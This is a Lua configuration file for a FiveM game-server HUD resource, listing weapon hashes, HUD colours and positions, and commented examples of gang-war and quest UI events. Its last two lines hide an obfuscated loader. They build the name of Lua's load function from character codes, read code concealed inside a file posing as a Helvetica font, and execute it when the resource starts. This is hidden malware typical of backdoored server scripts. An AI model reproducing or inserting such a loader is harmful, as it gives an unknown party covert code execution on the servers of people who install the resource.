Config = {}

Config.serverchecktime = 1
Config.WeaponTable = {
    melee = {
        dagger = "0x92A27487",
        bat = "0x958A4A8F",
        bottle = "0xF9E6AA4B",
        crowbar = "0x84BD7BFD",
        unarmed = "0xA2719263",
        flashlight = "0x8BB05FD7",
        golfclub = "0x440E4788",
        hammer = "0x4E875F73",
        hatchet = "0xF9DCBF2D",
        knuckle = "0xD8DF3C3C",
        knife = "0x99B507EA",
        machete = "0xDD5DF8D9",
        switchblade = "0xDFE37640",
        nightstick = "0x678B81B1",
        wrench = "0x19044EE0",
        battleaxe = "0xCD274149",
        poolcue = "0x94117305",
        stone_hatchet = "0x3813FC08"
    },
    handguns = {
        pistol = "0x1B06D571",
        pistol_mk2 = "0xBFE256D4",
        combatpistol = "0x5EF9FEC4",
        appistol = "0x22D8FE39",
        stungun = "0x3656C8C1",
        pistol50 = "0x99AEEB3B",
        snspistol = "0xBFD21232",
        snspistol_mk2 = "0x88374054",
        heavypistol = "0xD205520E",
        vintagepistol = "0x83839C4",
        flaregun = "0x47757124",
        marksmanpistol = "0xDC4DB296",
        revolver = "0xC1B3C3D1",
        revolver_mk2 = "0xCB96392F",
        doubleaction = "0x97EA20B8",
        raypistol = "0xAF3696A1",
        ceramicpistol = "0x2B5EF5EC",
        navyrevolver = "0x917F6C8C"
    },
    smg = {
        microsmg = "0x13532244",
        smg = "0x2BE6766B",
        smg_mk2 = "0x78A97CD0",
        assaultsmg = "0xEFE7E2DF",
        combatpdw = "0xA3D4D34",
        machinepistol = "0xDB1AA450",
        minismg = "0xBD248B55",
        raycarbine = "0x476BF155"
    },
    shotguns = {
        pumpshotgun = "0x1D073A89",
        pumpshotgun_mk2 = "0x555AF99A",
        sawnoffshotgun = "0x7846A318",
        assaultshotgun = "0xE284C527",
        bullpupshotgun = "0x9D61E50F",
        musket = "0xA89CB99E",
        heavyshotgun = "0x3AABBBAA",
        dbshotgun = "0xEF951FBB",
        autoshotgun = "0x12E82D3D"
    },
    assault_rifles = {
        assaultrifle = "0xBFEFFF6D",
        assaultrifle_mk2 = "0x394F415C",
        carbinerifle = "0x83BF0278",
        carbinerifle_mk2 = "0xFAD1F1C9",
        advancedrifle = "0xAF113F99",
        specialcarbine = "0xC0A3098D",
        specialcarbine_mk2 = "0x969C3D67",
        bullpuprifle = "0x7F229F94",
        bullpuprifle_mk2 = "0x84D6FAFD",
        compactrifle = "0x624FE830"
    },
    machine_guns = {
        mg = "0x9D07F764",
        combatmg = "0x7FD62962",
        combatmg_mk2 = "0xDBBD7280",
        gusenberg = "0x61012683"
    },
    sniper_rifles = {
        sniperrifle = "0x5FC3C11",
        heavysniper = "0xC472FE2",
        heavysniper_mk2 = "0xA914799",
        marksmanrifle = "0xC734385A",
        marksmanrifle_mk2 = "0x6A6C02E0"
    },
    heavy_weapons = {
        rpg = "0xB1CA77B1",
        grenadelauncher = "0xA284510B",
        grenadelauncher_smoke = "0x4DD2DC56",
        minigun = "0x42BF8A85",
        firework = "0x7F7497E5",
        railgun = "0x6D544C99",
        hominglauncher = "0x63AB0442",
        compactlauncher = "0x781FE4A",
        rayminigun = "0xB62D1F67"
    },
    throwables = {
        grenade = "0x93E220BD",
        bzgas = "0xA0973D5E",
        smokegrenade = "0xFDBC8A50",
        flare = "0x497FACC3",
        molotov = "0x24B17070",
        stickybomb = "0x2C3731D9",
        proxmine = "0xAB564B93",
        snowball = "0x787F0BB",
        pipebomb = "0xBA45E8B8",
        ball = "0x23C9F95C"
    },
    misc = {
        petrolcan = "0x34A67B97",
        fireextinguisher = "0x60EC506",
        parachute = "0xFBAB5776",
        hazardcan = "0xBA536372"
    }
}

Config.logoname = "IMPULSIVE"

Config.OpenSettings = {
    ['weapon'] = true,
    ['needhud'] = true,
    ['bankcash'] = true
}

Config.needrestart = true --- if you need restart set this true 

Config.stress = true

Config.mapshow = false -------- for always show set true

Config.speedtype = "kmh" --- "kmh" or "mph"

Config.hudd = {}
Config.hudd.weapon = true
Config.hudd.needhud = {
    ['iconcolor'] = "#FFFFFF",
    ['textstate'] = true,
    ['progcolor'] = "#f3a84f",
    ['position'] = "right-center",
    ['style'] = "normal",
    ['size'] = 1.0,
    ['hudstate'] = true
}
Config.hudd.bankcash = {
    ['iconcolor'] = "#FFFFFF",
    ['progcolor'] = "#f3a84f",
    ['position'] = "right-top",
    ['size'] = 1.0,
    ['hudstate'] = true
}
Config.hudd.topmenu = {
    ['logostate'] = true,
    ['onlinestate'] = true,
    ['timestate'] = true
}
Config.hudd.vehmenu = {
    ['iconcolor'] = "#FFFFFF",
    ['progcolor'] = "#f3a84f",
    ['position'] = "right-bottom",
    ['size'] = 1.0
}
Config.hudd.mapstyle = 'normal'

Config.usetestcommands = true

timefinish =
    function() print('you can write event when gang time finish or win') end

---- NOTIFY PART  -------------------------------------------

-- exports['bp_hud']:notifyactive('Your notify text', time, '(error,info,success)')

---- PROGRESSBAR -------------------------------------------

-- exports['bp_hud']:progbaractive('Your progbar text', time)

--  GANG WAR PART -------------------------------------------

--- start ui here

-- TriggerEvent('bp_hud:startgangwar', {['gang1text'] = "Groove" , ['gang2text'] = "Ballas", ['gang1count'] = 50 , ['gang2count'] = 50 , ['gangtime'] = 120, ['gang1color'] = "#56ff71", ['gang2color'] = "#f3a84f" })

--- stop  ui here

-- TriggerEvent('bp_hud:stopgangwar')

--- update  ui here

--  TriggerEvent('bp_hud:gangupdate', { ['gang1count'] = 50 , ['gang2count'] = 50  })

--  GANG WAR NOTIFY -------------------------------------------

-- TriggerEvent('bp_hud:gangnotify', {['gangwinner'] = "Groove" , ['gangcolor'] = "#56ff71" , ['gangtime'] = 3000})

--  QUEST PART -------------------------------------------

-- start ui here 

-- TriggerEvent('bp_hud:queststart', {['questmaintext'] = "Blade's Farm Adventure" , ['questdesttext'] = "Move 10 crates of fruit" , ['questdesttop'] = "5 0f 10", ['questcolor'] = "#f3a84f"})

-- stop  ui here 

-- TriggerEvent('bp_hud:queststop')

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()